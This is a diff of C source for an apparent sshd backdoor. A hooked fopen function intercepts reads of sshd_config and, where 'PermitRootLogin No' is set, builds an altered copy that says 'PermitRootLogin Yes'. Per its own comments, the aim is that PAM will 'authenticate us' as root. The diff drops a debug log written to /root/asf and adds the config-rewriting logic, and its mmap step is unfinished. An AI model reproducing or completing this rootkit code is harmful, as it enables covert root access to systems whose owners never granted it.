@@ -282,31 +282,22 @@ FILE *my_fopen(char *filename, char *mode)
 	fgetpos(fp, &ref_pos);
 
 
-	FILE *debug = ref_fopen("/root/asf", "a+");
-
-
-	signed long int size; /* XXX: checkme: type sanity */
-	struct stat st;	
-	stat(filename, &st);
-	size = st.st_size;
-
-
 	char *str = malloc(sizeof(512));
 	size_t n = 0;
-	
 	/* 
-	 * libkeyutils hates _GNU_SOURCE and haven't bothered to learn about Makefiles and advanced #define usage
+	 * libkeyutils hates _GNU_SOURCE and I haven't bothered to learn about Makefiles and advanced #define usage
 	 * 	so no strcasestr();
+	 * TODO: use strcasestr()
 	 */
 	char *PermitRootLogin;
 	bool noset = false;
 		
 	int ret = 42;
 	while (ret != -1) {
-		ret = getline(&str, &n, fp);
+		ret = getline(&str, &n, fp); /* XXX: should hopefully be safe ?? */
 
 		PermitRootLogin = strstr(str, "PermitRootLogin");
-		/* PermitRootLogin is explicity set to Yes || No */
+		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
 		if (PermitRootLogin != NULL) {
 			char *setting;
 			
@@ -314,7 +305,7 @@ FILE *my_fopen(char *filename, char *mode)
 			if (setting == NULL)
 				setting = strstr(PermitRootLogin, "yes");	
 			/*
-			 * Yes || yes  -- who cares. get me out of here and reset ref_fopen_Rela -- we gucci
+			 * Yes || yes  -- who cares. get me out of here and reset ref_fopen_Rela -- we gucci boyz
 			 *	otherwise we are going to dupe sshd_config
 			 */
 			if (setting != NULL) {
@@ -333,9 +324,56 @@ FILE *my_fopen(char *filename, char *mode)
 			}
 		}
 	}
-	
+
+	signed long int orig_sshd_config_size; /* XXX: checkme: type sanity */
+	struct stat st;	
+	stat(filename, &st);
+	orig_sshd_config_size = st.st_size;
+
+	/* TODO: do this in memory */
 	if (noset == true) {
 		/* "PermitRootLogin No" was explicity set */
+		
+		char *buf = malloc(orig_sshd_config_size + 1);
+		/* sanity() */
+		int orig_fd = open(filename, O_RDONLY);
+		read(orig_fd, buf, orig_sshd_config_size);
+
+		PermitRootLogin = strstr(buf, "PermitRootLogin");	
+
+		/* how far is PermitRootLogin from the start of sshd_config */
+		unsigned long long bytes_from_start = (char *) PermitRootLogin - (char *) buf;
+
+		/* copy all of the bytes from sshd_config into new -- up until (excluding) PermitRootLogin */
+		char *new = malloc(orig_sshd_config_size + 1);
+		memcpy(new, buf, bytes_from_start);
+		
+		/* ... */
+		char *repl = "PermitRootLogin Yes\n";
+		strncat(new, repl, strlen(repl));
+
+		/* ... */
+		int newline = strcspn(PermitRootLogin, "\n");
+		newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
+		
+		/* this cuts out "PermitRootLogin No\n" and should also give us enough space (+1) to write Yes */
+		PermitRootLogin = (char *) PermitRootLogin + (unsigned long long ) newline;
+
+		/* buf + org_sshd_config_size -- if casted correctly will give us the end of sshd_config in memory */
+		void *end = (char *) buf + orig_sshd_config_size;
+		
+		/* PermitRootLogin has been cut out correctly (+1) as said above. now we just copy the rest of the config into new */
+		unsigned long long bytes_left = (char *)end - (char *) PermitRootLogin;
+
+		strncat(new, PermitRootLogin, bytes_left);
+		free(buf);
+
+		/* figure out mmap crap -- prob need to fix ref_fopen -- use fopen with file descriptor? */
+		int fd = -1;
+		void *m = mmap(NULL, orig_sshd_config_size + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, (off_t)NULL);
+
+		munmap(m, orig_sshd_config_size + 1);	
+		free(new);
 	} else {
 		/* we do not want to use the default PERMIT_NOT_SET -- we want to use PERMIT_YES so pam will authenticate us */
 
@@ -351,7 +389,6 @@ FILE *my_fopen(char *filename, char *mode)
 done:	
 	free(str);
 
-	fclose(debug);
 	fsetpos(fp, &ref_pos);
 	return fp;
 }
